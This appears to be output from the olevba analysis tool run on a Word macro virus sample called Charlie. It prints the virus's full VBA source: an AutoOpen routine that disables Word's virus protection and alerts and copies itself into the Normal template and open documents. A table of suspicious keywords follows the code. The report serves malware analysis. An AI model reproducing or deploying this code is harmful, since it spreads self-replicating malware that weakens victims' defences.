olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Charlie
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Charlie - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Charlie.bas 
in file: Virus.MSWord.Charlie - OLE stream: 'Macros/VBA/Charlie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error Resume Next

Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.EnableCancelKey = wCancelDisabled
Application.DisplayStatusBar = False
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone

Set Doc = ActiveDocument.VBProject.VBComponents
Set Tmp = NormalTemplate.VBProject.VBComponents

Const ExportSource = "c:\Windows\Command\Charles.sys"
Const VirName = "Charlie"
Application.VBE.ActiveVBProject.VBComponents("Charlie").Export ExportSource

For i = 1 To Tmp.Count
    If Tmp(i).Name = VirName Then TmpInstalled = 1
Next i

For j = 1 To Doc.Const
    If Doc(j).Name = VirName Then DocInstalled = 1
Next j

If TmpInstalled = 0 Then
    Tmp.Import ExportSource
    NormalTemplate.Save
End If

If DocInstalled = 0 Then
    Doc.Import ExportSource
    ActiveDocument.SaveAs FileName:=ActiveDocumen.FullName
End If

MsgBox "It Is Waiting For You Mr. Charles", 0, "Word.Charlie"

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

